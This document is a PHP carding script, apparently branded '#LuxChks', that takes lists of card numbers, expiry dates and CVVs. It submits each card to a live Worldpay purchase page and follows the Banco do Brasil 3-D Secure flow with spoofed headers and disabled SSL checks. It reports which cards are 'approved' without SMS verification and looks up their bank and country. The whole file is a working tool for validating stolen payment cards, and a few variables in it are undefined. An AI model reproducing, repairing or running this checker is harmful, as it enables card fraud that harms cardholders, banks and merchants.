<?php

#############################################
error_reporting(0);
set_time_limit(0);


$time = time();

if(file_exists(getcwd().'/cookie.txt')){
unlink(getcwd().'/cookie.txt');
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'proxy.txt');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$proxy = curl_exec($ch);

function dados($index,$campo,$value){
$lista = explode($campo,$index)[1];
return(explode($value,$lista)[0]);
}

function brand($cartao){
$check = array(
"Visa" => "/^4[0-9]{12}(?:[0-9]{3})?$/",
"Master" => "/^5[1-5][0-9]{14}$/"
);
foreach($check as $bandeira => $regex){
if(preg_match($check[$bandeira], $cartao)){
return trim($bandeira);
}}}

$email = trim(uniqid());
$array = $_GET["lista"];
$num = trim(explode("|",$array)[0]);
$mes = trim(explode("|",$array)[1]);
$ano = trim(explode("|",$array)[2]);
$cvv = trim(explode("|",$array)[3]);
$bin = substr($cc,0,6);


if(strlen($mes) > 1 AND $mes < 10){
$mes = substr($mes, 1,1);
}

if(strlen($ano) == 2){
$ano = "20$ano";
}

if(empty(brand($num))){
echo '<span class="badge badge-danger">Reprovada '.$num.'|'.$mes.'|'.$ano.'|'.$cvv.' | Retorno: [Cartão recusado!]</span>';
sleep(1);
exit();
}

$ch = curl_init();
curl_setopt_array($ch, array(
CURLOPT_URL => "https://secure.worldpay.com/wcc/purchase?instId=56688&testMode=0&cartId=1&currency=GBP&amount=10",
CURLOPT_RETURNTRANSFER => true,
CURLOPT_COOKIESESSION => true,
CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
CURLOPT_USERAGENT => "Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36",
));
$chk = curl_exec($ch);

$PaymentID = dados($chk, 'NAME=PaymentID VALUE="','"');

$ch = curl_init();
curl_setopt_array($ch, array(
CURLOPT_URL => "https://secure.worldpay.com/wcc/purchase",
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_COOKIESESSION => false,
CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
CURLOPT_USERAGENT => "Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36",
CURLOPT_POST => true,
CURLOPT_POSTFIELDS => 'PaymentID='.$PaymentID.'&Lang=pt&authCurrency=GBP&op-DPChoose-ECMC%5ESSL.x=35&op-DPChoose-ECMC%5ESSL.y=20'));
$xx = curl_exec($ch);

$ch = curl_init();
curl_setopt_array($ch, array(
CURLOPT_URL => "https://secure.worldpay.com/wcc/card",
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_USERAGENT => "Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36",
CURLOPT_COOKIESESSION => false,
CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
CURLOPT_POST => true,
CURLOPT_POSTFIELDS => 'PaymentID='.$PaymentID.'&Lang=pt&cardNoInput='.$num.'&cardNoJS=&cardNoHidden=*oculto*&cardCVV=000&cardExp.day=32&cardExp.time=23%3A59%3A59&cardExp.month='.$mes.'&cardExp.year='.$ano.'&name=Paulo+Cesar+Silva&address1=Rua+Netuno&address2=&address3=&town=Nova+Lima&region=&postcode=&country=BR&tel=&fax=&email='.$email.'%40gmail.com&op-PMMakePayment.x=102&op-PMMakePayment.y=9'));
$xx = curl_exec($ch);

$PaReq = dados($xx, 'name="PaReq" value="','"');
$TermUrl = dados($xx, 'name="TermUrl" value="','"');
$MD = dados($xx, 'name="MD" value="','"');
$url = dados($xx, 'action="','"');
$host = dados($url, '//','/');

if (strpos($xx, 'auth.bb') or strpos($xx, 'https://www66.bb.com.br/SecureCodeAuth')) {

$ch = curl_init();
curl_setopt_array($ch, array(
CURLOPT_URL => $url,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_SSL_VERIFYHOST => false,
CURLOPT_SSL_VERIFYPEER => false,
CURLOPT_HTTPHEADER => array(
"Host: $host",
"Connection: keep-alive",
"Origin: https://odeme.tysd.org.tr",
"Content-Type: application/x-www-form-urlencoded",
"User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36",
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
"Referer: https://odeme.tysd.org.tr/",
"Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7"),
CURLOPT_POST => true,
CURLOPT_POSTFIELDS =>
'_charset_=UTF-8&PaReq='.$PaReq.'&MD='.$MD.'&TermUrl='.$TermUrl));
$cx = curl_exec($ch);

$path = dados($cx, 'action="','"');
$link = "https://$host$path";

$ch = curl_init();
curl_setopt_array($ch, array(
CURLOPT_URL => $link,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_SSL_VERIFYHOST => false,
CURLOPT_SSL_VERIFYPEER => false,
CURLOPT_HTTPHEADER => array(
"Host: $host",
"Connection: keep-alive",
"Origin: https://$host",
"Content-Type: application/x-www-form-urlencoded",
"User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36",
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
"Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7"),
CURLOPT_POST => true,
CURLOPT_POSTFIELDS => 'TermUrl='.urlencode($TermUrl).'&PaReq='.urlencode($PaReq).'&MD='.urlencode($MD)));
$retorno = curl_exec($ch);

if(strpos($retorno, "Selecione um celular para receber o código de confirmação")){
echo '<span class="badge badge-danger">Reprovada '.$num.'|'.$mes.'|'.$ano.'|'.$cvv.' | Retorno: [Cartão recusado! - VBV SMS]</span>';
sleep(1);
//contar_lives($conexao);
exit();
}else if(strpos($retorno, "Prezado cliente, esta transa&ccedil;&atilde;o, realizada a partir deste dispositivo m&oacute;vel, n&atilde;o ser&aacute; permitida.")){

        $fim = file_get_contents("https://bin.generator.creditcard/?a=$bin&s=s");
        $pais = dados($fim, '>Country:</label> </td><td><input type="text" value="', '"');
        $brand = dados($fim, 'Card Brand:</label> </td><td><input type="text" value="', '"');
        $banco = dados($fim, 'Bank Name:</label> </td><td><input type="text" value="', '"');
        $level = dados($fim, 'Card Level:</label> </td><td><input type="text" value="', '"');
        $tipo_da_bin = dados($fim, 'Card Type:</label> </td><td><input type="text" value="', '"');

echo '<span class="badge badge-success">✅ Aprovada '.$num.'|'.$mes.'|'.$ano.'|'.$cvv.' - '.$bandeira.' '.$banco.' '.$teste.' '.$level.' '.$pais.' Retorno: [ Pagamento Aprovado! - Sem VBV ] | Tempo de Resposta: ' .(time() - $time). ' | #LuxChks</span>';
sleep(1);
exit();
}
}else{
echo '<span class="badge badge-danger">#Reprovada '.$num.'|'.$mes.'|'.$ano.'|'.$cvv.' | Retorno: [Cartão recusado! - Invalido]</span>';
sleep(1);
exit();
}

?>